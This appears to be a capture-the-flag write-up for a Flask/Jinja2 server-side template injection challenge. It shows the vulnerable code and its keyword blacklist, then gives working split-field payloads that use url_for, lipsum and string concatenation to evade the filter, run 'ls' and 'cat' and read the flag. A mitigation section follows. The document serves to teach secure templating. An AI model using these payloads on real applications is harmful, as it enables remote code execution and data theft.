# Message To The World

**CTF:** BeeCTF 2025

**Category:** Web

**Difficulty:** 

**Tags:** Flask, Jinja2, SSTI

**Author:** 

**Date:** 2025

## Objective

Exploit a Server-Side Template Injection (SSTI) vulnerability to achieve RCE and read the hidden flag.

## Overview

A medium-difficulty web exploitation challenge centered around a Python Flask web application. The application provides a simple message board interface where users can submit an author name and a message, which are subsequently rendered on the page. Although the application attempts to prevent security risks by implementing an input validation blacklist to detect Server-Side Template Injection (SSTI) attempts, the filtering logic contains a subtle flaw. By carefully analyzing how the inputs are processed and concatenated, attackers can split their payload across multiple input fields and use Jinja2 string manipulation to completely bypass the web application firewall (WAF), achieving Remote Code Execution (RCE) and reading the hidden flag.

## Analysis

We are presented with a Flask web application that takes two inputs: `author` and `message`. Upon inspecting the backend code (`app.py`), we can see how the application processes these inputs:

```python
from flask import Flask, request, render_template_string
app = Flask(__name__)

BANNED = ["{{", "}}", "os", "system", "class", "popen", "subprocess", "import", "request", "self", "config", "env", "eval", "exec", "locals", "{%", "%}"]

@app.route("/", methods=["GET", "POST"]) 
def index():
   if request.method == "POST":
	   author = request.form.get("author", "")
	   message = request.form.get("message", "")

	   counter = 0
	   for token in BANNED:
		   if token in author:
			   counter += 1
	   if counter >= 2:
		   return "Error: looks like SSTI attempt at author!", 400

	   counter = 0
	   for token in BANNED:
		   if token in message:
			   counter += 1
	   if counter >= 2:
		   return "Error: looks like SSTI attempt at message!", 400

	   tpl = "Message to the world from, "+ author + " " + message + ""
	   return render_template_string(tpl)
```

### Vulnerability Mechanics

1. **SSTI Vulnerability:** The core issue lies in the way the template string is constructed and rendered:

```python
tpl = "Message to the world from, "+ author + " " + message + ""
return render_template_string(tpl)
```

User inputs are directly concatenated into the template string instead of being passed as context variables. This allows Jinja2 template expressions to execute server-side.

2. **Flawed WAF Logic:** The blacklist filter evaluates `author` and `message` separately. The application throws an error **only** if a single field contains two or more blacklisted keywords (`counter >= 2`). This lets an attacker split dangerous tokens across fields so neither field alone appears malicious.

### The Strategy

We can bypass this mitigation using two logical flaws:

- **Payload Splitting:** Because the application concatenates `author` and `message` before rendering them, we can put the opening tag `{{` in the `author` field, and the closing tag `}}` in the `message` field. This ensures neither field exceeds the threshold of 2 banned words.

- **String Concatenation:** Jinja2 allows string concatenation using the tilde (`~`) operator. We can bypass keyword blocks (like `os` or `import`) by breaking them into smaller strings (e.g., `'o'~'s'`).

## Solution (`url_for` & `__builtins__`)

To achieve Remote Code Execution (RCE) or read files, we need access to Python's underlying functions. By targeting a standard Jinja2 global function like `url_for`, we can traverse into its global namespace, access `__builtins__`, and fetch the modules we need.

We split our payload across both inputs. We use `'o'~'s'` to mask the word `os`, and `'__impo'~'rt__'` to mask `__import__`.

```jinja
# Payload to list dir
author = {{ url_for.__globals__['__builtins__']['__impo'~'rt__']('o'~'s').listdir('.')
message = }}

# Payload to read flag file
author = {{ url_for.__globals__['__builtins__']['o'~'pen']('flag_qxbmuCk2.txt').read()
message = }}
```

These payloads call `__import__('os').listdir('.')` or `open('flag_qxbmuCk2.txt').read()` via Jinja2's access paths and read files from the application directory.

### Alternative Method (`lipsum`)

Alternatively, standard Jinja2 functions like `lipsum` can be leveraged alongside the `|attr()` filter to safely navigate attributes without using bracket notation that might trigger further filter issues. The `|attr()` filter helps avoid direct `['key']` indexing when needed.

```jinja
# list dir
author = {{ (lipsum|attr('__globals__')|attr('__getitem__')('o'~'s')
message = |attr('p'~'o'~'p'~'e'~'n')('ls /app'))|attr('read')() }}

# read flag
author = {{ (lipsum|attr('__globals__')|attr('__getitem__')('o'~'s')
message = |attr('p'~'o'~'p'~'e'~'n')('cat /app/*.txt'))|attr('read')() }}
```

Both approaches allow invoking builtins and module functions while avoiding direct banned tokens and maintain the payload split across `author` and `message`.

## Conclusion

Both methods successfully exploit the application's template rendering flaw by weaponizing its lenient splitting logic and using Jinja2 string manipulation to completely blind the WAF.

**Flag:** `BEECTF{Messg4g3_T0_Th3_W0rld_W1th_SST1}`

## Mitigation

Never concatenate untrusted input into a template and pass it to `render_template_string`. Instead, keep the template static (e.g., in a `.html` file) and pass `author`/`message` as **context variables** so Jinja2 will treat them as data (auto-escaped) rather than executable template syntax. If you must render user content, explicitly escape it (e.g., `markupsafe.escape`) and avoid `|safe`. Also remove the blacklist-based WAF approach (it’s brittle and bypassable via splitting/concatenation) and rely on correct templating + output encoding; optionally add input length limits and rate limiting to reduce abuse impact.
